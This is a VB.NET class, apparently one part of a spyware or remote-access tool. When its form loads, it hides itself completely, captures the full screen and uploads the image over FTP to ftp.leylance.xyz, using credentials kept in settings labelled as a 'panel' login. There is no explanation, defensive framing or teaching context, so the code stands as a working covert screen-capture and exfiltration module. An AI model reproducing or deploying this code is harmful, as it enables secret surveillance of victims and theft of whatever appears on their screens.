Imports System.IO
Imports System.Net
Public Class screencap
    Private Declare Function CreateDC Lib "gdi32" Alias "CreateDCA" (ByVal lpDriverName As String, ByVal lpDeviceName As String, ByVal lpOutput As String, ByVal lpInitData As String) As Integer

    Private Declare Function CreateCompatibleDC Lib "GDI32" (ByVal hDC As Integer) As Integer

    Private Declare Function CreateCompatibleBitmap Lib "GDI32" (ByVal hDC As Integer, ByVal nWidth As Integer, ByVal nHeight As Integer) As Integer

    Private Declare Function GetDeviceCaps Lib "gdi32" Alias "GetDeviceCaps" (ByVal hdc As Integer, ByVal nIndex As Integer) As Integer

    Private Declare Function SelectObject Lib "GDI32" (ByVal hDC As Integer, ByVal hObject As Integer) As Integer

    Private Declare Function BitBlt Lib "GDI32" (ByVal srchDC As Integer, ByVal srcX As Integer, ByVal srcY As Integer, ByVal srcW As Integer, ByVal srcH As Integer, ByVal desthDC As Integer, ByVal destX As Integer, ByVal destY As Integer, ByVal op As Integer) As Integer

    Private Declare Function DeleteDC Lib "GDI32" (ByVal hDC As Integer) As Integer

    Private Declare Function DeleteObject Lib "GDI32" (ByVal hObj As Integer) As Integer

    Const SRCCOPY As Integer = &HCC0020

    Private bmpBackground As Bitmap
    Private intWidth, intHeight As Integer
    Dim imagename As String
    Dim userpanel As String = My.Settings.userpanel
    Dim userpass As String = My.Settings.panelpass
    Dim foldername As String = "screenshot" + My.Settings.imgexten

    Protected Sub CaptureScreen()

        Dim hsdc, hmdc As Integer
        Dim bmpHandle, OLDbmpHandle As Integer
        Dim releaseDC As Integer

        hsdc = CreateDC("DISPLAY", "", "", "")
        hmdc = CreateCompatibleDC(hsdc)

        intWidth = GetDeviceCaps(hsdc, 8)
        intHeight = GetDeviceCaps(hsdc, 10)
        bmpHandle = CreateCompatibleBitmap(hsdc, intWidth, intHeight)

        OLDbmpHandle = SelectObject(hmdc, bmpHandle)
        releaseDC = BitBlt(hmdc, 0, 0, intWidth, intHeight, hsdc, 0, 0, 13369376)
        bmpHandle = SelectObject(hmdc, OLDbmpHandle)

        releaseDC = DeleteDC(hsdc)
        releaseDC = DeleteDC(hmdc)

        bmpBackground = Image.FromHbitmap(New IntPtr(bmpHandle))
        DeleteObject(bmpHandle)

    End Sub
    Private Sub screencap_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Me.Size = Size.Empty
        PictureBox1.Size = Size.Empty
        Me.Visible = False
        Me.ShowIcon = False
        Me.ShowInTaskbar = False



        Try
            imagename = DateTime.Now.ToString("dd-MMM-yyyy HH:mm:ss tt") + ".bmp"
            CaptureScreen()
            PictureBox1.Image = bmpBackground
            PictureBox1.Image.Save("Capture.jpg")
            My.Computer.Network.UploadFile("Capture.jpg", "ftp://ftp.leylance.xyz/" + foldername + "/654f651ds6v1as65cv1sv6ad51v6v1as65v1asv65as1v5f1v5v1as65vsa65vas65v65bfgb4gb156g1b/" + imagename, "u945780831." + userpanel, userpass)
            Me.Close()
        Catch ex As WebException
            MsgBox(ex.Message)
        End Try
    End Sub
End Class